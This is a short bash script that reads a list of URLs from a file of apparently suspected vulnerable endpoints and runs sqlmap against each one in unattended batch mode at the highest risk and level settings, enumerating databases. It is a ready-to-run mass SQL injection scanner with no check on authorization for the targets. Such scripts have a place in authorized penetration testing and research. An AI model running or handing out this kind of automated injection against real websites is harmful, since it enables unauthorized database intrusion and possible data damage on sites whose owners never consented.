#!/bin/bash


path_dir='../result/url_possible_vulnarblities/all_possible_vulns_urls.txt'
# Check if the file with URLs is provided as an argument
if [ -z "$path_dir" ]; then
  echo "Usage: $0 <file_with_urls>"
  exit 1
fi

# Read the file line by line
cat $path_dir | while IFS= read -r url; do
  # Check if the line is not empty
  echo $url
  if [ -n "$url" ]; then
    echo "Running sqlmap on: $url"
    # Run sqlmap on the current URL
    sqlmap -u "$url" --batch --risk=3 --level=5 --dbs
  fi
done 

